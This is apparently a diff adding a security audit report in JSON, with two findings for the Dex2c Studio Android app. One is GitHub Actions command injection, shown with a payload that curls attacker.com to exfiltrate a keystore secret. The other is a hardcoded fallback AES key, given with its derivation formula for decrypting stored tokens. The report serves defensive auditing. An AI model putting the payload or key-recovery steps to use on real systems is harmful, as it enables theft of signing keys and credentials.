@@ -1,0 +1,146 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "dex2c-workflow-actions-script-injection",
+    "title": "GitHub Actions workflow inline script injection via unquoted user inputs",
+    "description": "Dex2cWorkflowGenerator directly embeds unquoted github.event.inputs expressions into bash run scripts in dex2c.yml, allowing malicious workflow parameters to execute arbitrary shell commands and steal repository signing secrets.",
+    "root_cause": "Dex2cWorkflowGenerator.kt string template interpolates ${{ github.event.inputs.* }} directly inside run: | scripts rather than passing them via intermediate environment variables.",
+    "intended_behavior": "Workflow inputs should be mapped to environment variables (e.g., env: APP_NAME: ${{ github.event.inputs.app_name }}) and referenced via safe shell variables ($APP_NAME).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/src/main/java/com/dex2c/studio/cloud/Dex2cWorkflowGenerator.kt",
+        "line": 28,
+        "scope": "generateDex2cYaml",
+        "description": "Workflow defines workflow_dispatch inputs including apk_path, apk_url, app_name, custom_loader."
+      },
+      {
+        "kind": "propagation",
+        "file": "app/src/main/java/com/dex2c/studio/cloud/Dex2cWorkflowGenerator.kt",
+        "line": 226,
+        "scope": "generateDex2cYaml",
+        "description": "Unvalidated curl and cp commands directly embed ${{ github.event.inputs.apk_url }} and ${{ github.event.inputs.apk_path }}."
+      },
+      {
+        "kind": "sink",
+        "file": "app/src/main/java/com/dex2c/studio/cloud/Dex2cWorkflowGenerator.kt",
+        "line": 318,
+        "scope": "generateDex2cYaml",
+        "description": "Raw string interpolation of ${{ github.event.inputs.app_name }} and ${{ github.event.inputs.apk_path }} in step sharing signing secrets (KEYSTORE_B64, KEYSTORE_PASS)."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/src/main/java/com/dex2c/studio/cloud/Dex2cWorkflowGenerator.kt",
+        "line": 316,
+        "description": "APP_NAME=\"${{ github.event.inputs.app_name }}\" evaluated directly in bash script with repository secrets present."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Workflow is dispatched with custom input containing shell metacharacters."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A user or CI dispatcher triggering the GitHub Actions workflow with crafted inputs.",
+      "payloads": [
+        "app\" $(curl attacker.com?data=$KEYSTORE_B64) #"
+      ],
+      "instructions": [
+        "Trigger workflow dispatch with malicious app_name or apk_path."
+      ],
+      "observed_result": "Bash command injection in runner step with access to KEYSTORE_BASE64 and keystore passwords."
+    },
+    "remediation": {
+      "strategy": "Pass all github.event.inputs through env: blocks in the action step rather than inline string interpolation."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires workflow dispatch permissions or access to dispatch the generated workflow."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Arbitrary command execution in GitHub Actions runner and exfiltration of production signing keystore secrets."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Direct code review of generated workflow YAML confirms lack of environment variable binding."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "keystore-token-encryptor-fallback-hardcoded-key",
+    "title": "Insecure fallback to static hardcoded AES key on AndroidKeyStore exception",
+    "description": "KeystoreTokenEncryptor catches all Exceptions when acquiring the AndroidKeyStore key or performing cryptographic operations, and silently falls back to a deterministic, hardcoded static byte array for AES-GCM encryption of GitHub personal access tokens.",
+    "root_cause": "KeystoreTokenEncryptor.kt uses a hardcoded 32-byte static fallbackKey on any Exception, compromising confidentiality of OAuth tokens whenever KeyStore is locked, uninitialized, or fails.",
+    "intended_behavior": "Cryptographic operations on sensitive OAuth credentials should fail closed with an explicit error to the user rather than silently encrypting credentials with a publicly derived static key.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/src/main/java/com/dex2c/studio/data/TokenEncryptor.kt",
+        "line": 87,
+        "scope": "encrypt",
+        "description": "User enters or refreshes GitHub OAuth access token."
+      },
+      {
+        "kind": "propagation",
+        "file": "app/src/main/java/com/dex2c/studio/data/TokenEncryptor.kt",
+        "line": 82,
+        "scope": "getOrCreateKey",
+        "description": "Catch-all blocks catch Exception and return fallbackKey."
+      },
+      {
+        "kind": "sink",
+        "file": "app/src/main/java/com/dex2c/studio/data/TokenEncryptor.kt",
+        "line": 105,
+        "scope": "encrypt",
+        "description": "Cipher initializes with fallbackKey and persists ciphertext to DataStore preferences."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/src/main/java/com/dex2c/studio/data/TokenEncryptor.kt",
+        "line": 55,
+        "description": "Static fallbackKey = ByteArray(32) { (it * 31 + 17).toByte() }."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "environmental_dependency",
+        "description": "AndroidKeyStore fails or throws an exception during encryption."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Local adversary or backup inspector inspecting stored preferences.",
+      "payloads": [
+        "enc:v1:<base64-ciphertext>"
+      ],
+      "instructions": [
+        "Derive AES key using known formula (it * 31 + 17) and decrypt with standard AES-GCM."
+      ],
+      "observed_result": "Plaintext GitHub OAuth token is recovered without AndroidKeyStore hardware-backed protection."
+    },
+    "remediation": {
+      "strategy": "Limit fallback key strictly to JVM unit test environments (e.g. check BuildConfig.DEBUG or unit test flags), and fail closed in production if AndroidKeyStore fails."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requires AndroidKeyStore failure or specific JVM environment misconfiguration."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Loss of OAuth token confidentiality allowing repository access."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Static code analysis reveals hardcoded byte array key in TokenEncryptor.kt."
+    }
+  }
+]
